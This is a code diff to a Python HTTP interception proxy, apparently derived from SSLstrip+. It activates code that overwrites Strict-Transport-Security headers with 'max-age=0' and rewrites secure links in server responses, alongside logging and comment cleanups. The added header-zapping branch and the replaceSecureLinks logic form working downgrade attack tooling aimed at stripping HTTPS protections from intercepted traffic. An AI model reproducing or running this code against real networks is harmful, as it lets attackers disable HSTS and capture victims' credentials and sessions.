@@ -109,6 +109,8 @@ class ServerConnection(HTTPClient):
         self.client.setResponseCode(int(code), message)
 
     def handleHeader(self, key, value):
+        logging.debug("[ServerConnection] Receiving header: (%s => %s)" % (key, value))
+
         if (key.lower() == 'location'):
             value = self.replaceSecureLinks(value)
 
@@ -121,20 +123,21 @@ class ServerConnection(HTTPClient):
             if (value.find('gzip') != -1):
                 logging.debug("Response is compressed...")
                 self.isCompressed = True
-        
-        #if (key.lower() == 'strict-transport-security'):
-        #    value = 'max-age=0'
+
+        elif (key.lower()== 'strict-transport-security'):
+            value="max-age=0"
+            logging.info("Zapped a strict-trasport-security header")
 
         elif (key.lower() == 'content-length'):
             self.contentLength = value
+
         elif (key.lower() == 'set-cookie'):
             self.client.responseHeaders.addRawHeader(key, value)
+        
         else:
             self.client.setHeader(key, value)
 
         self.plugins.hook()
-
-        logging.debug("Receiving header: (%s => %s)" % (key, value))
 
     def handleEndHeaders(self):
        if (self.isImageRequest and self.contentLength != None):
@@ -185,12 +188,9 @@ class ServerConnection(HTTPClient):
     def replaceSecureLinks(self, data):
         if self.hsts:
 
-            #Original code from SSLstrip+
-            #Saying that this is unreadible is an understatement
-            #KILL IT WITH FIRE!!
-
             sustitucion = {}
             patchDict = self.urlMonitor.patchDict
+
             if len(patchDict)>0:
                 dregex = re.compile("(%s)" % "|".join(map(re.escape, patchDict.keys())))
                 data = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), data)
@@ -199,9 +199,9 @@ class ServerConnection(HTTPClient):
             for match in iterator:
                 url = match.group()
 
-                logging.debug("Found secure reference: " + url)
+                logging.debug("[ServerConnection] Found secure reference: " + url)
                 nuevaurl=self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
-                logging.debug("LEO replacing %s => %s"%(url,nuevaurl))
+                logging.debug("[ServerConnection][HSTS] Replacing %s => %s"%(url,nuevaurl))
                 sustitucion[url] = nuevaurl
                 #data.replace(url,nuevaurl)
 
@@ -210,11 +210,11 @@ class ServerConnection(HTTPClient):
                 dregex = re.compile("(%s)" % "|".join(map(re.escape, sustitucion.keys())))
                 data = dregex.sub(lambda x: str(sustitucion[x.string[x.start() :x.end()]]), data)
 
-            #logging.debug("LEO DEBUG received data:\n"+data)   
+            #logging.debug("HSTS DEBUG received data:\n"+data)   
             #data = re.sub(ServerConnection.urlExplicitPort, r'https://\1/', data)
             #data = re.sub(ServerConnection.urlTypewww, 'http://w', data)
             #if data.find("http://w.face")!=-1:
-            #   logging.debug("LEO DEBUG Found error in modifications")
+            #   logging.debug("HSTS DEBUG Found error in modifications")
             #   raw_input("Press Enter to continue")
             #return re.sub(ServerConnection.urlType, 'http://web.', data)
             return data
